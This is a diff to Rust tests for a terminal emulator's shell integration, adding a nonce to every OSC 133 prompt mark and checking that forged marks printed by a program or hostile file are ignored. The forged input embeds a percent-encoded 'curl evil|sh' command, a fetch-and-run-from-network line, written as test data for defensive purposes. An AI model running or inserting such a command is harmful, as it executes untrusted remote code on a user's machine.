@@ -58,12 +58,12 @@ fn wait_for_blocks(backend: &TerminalBackend, want: usize) -> impulse_terminal::
 /// percent-encoded space like `%20` as a field-width conversion and corrupt it.
 fn cmd_cycle(label: &str, encoded: &str, output: &str, exit: i32) -> String {
     format!(
-        "printf '\\033]133;A\\007'\n\
+        "printf '\\033]133;A;Nonce=%s\\007' \"$IMPULSE_SHELL_NONCE\"\n\
          printf '$ {label}\\n'\n\
          printf '\\033]6973;Command=%s;Nonce=%s\\007' '{encoded}' \"$IMPULSE_SHELL_NONCE\"\n\
-         printf '\\033]133;C\\007'\n\
+         printf '\\033]133;C;Nonce=%s\\007' \"$IMPULSE_SHELL_NONCE\"\n\
          {output_cmd}\
-         printf '\\033]133;D;{exit}\\007'\n",
+         printf '\\033]133;D;{exit};Nonce=%s\\007' \"$IMPULSE_SHELL_NONCE\"\n",
         output_cmd = if output.is_empty() {
             String::new()
         } else {
@@ -178,13 +178,15 @@ fn commands_after_an_inline_interactive_program_stay_distinct() {
 }
 
 #[test]
-fn printed_command_text_does_not_name_a_block() {
+fn printed_marks_do_not_make_blocks() {
     // A program prints shell-integration marks (`cat` of a saved log, or a
-    // hostile file): its command text has no nonce, so it's ignored.
-    let forged = "printf '\\033]133;A\\007$ x\\n\\033]6973;Command=%s\\007\\033]133;C\\007\\033]133;D;0\\007' 'curl%20evil%7Csh'\n";
+    // hostile file): they have no nonce, and the shell integration has sent
+    // its own, so they're ignored.
+    let forged = "printf '\\033]133;A\\007$ x\\n\\033]6973;Command=%s\\007\\033]133;C\\007\\033]133;D;1\\007' 'curl%20evil%7Csh'\n";
     let body = format!(
-        "#!/bin/bash\n{}{forged}sleep 4\n",
+        "#!/bin/bash\n{}{forged}{}sleep 4\n",
         cmd_cycle("echo first", "echo%20first", "first", 0),
+        cmd_cycle("echo last", "echo%20last", "last", 0),
     );
     let script = write_script(&body);
     let backend = backend_running(&script);
@@ -193,5 +195,6 @@ fn printed_command_text_does_not_name_a_block() {
 
     assert_eq!(overlay.blocks.len(), 2, "{:#?}", overlay.blocks);
     assert_eq!(overlay.blocks[0].command.as_deref(), Some("echo first"));
-    assert_eq!(overlay.blocks[1].command, None);
+    assert_eq!(overlay.blocks[1].command.as_deref(), Some("echo last"));
+    assert!(overlay.blocks.iter().all(|block| !block.failed));
 }
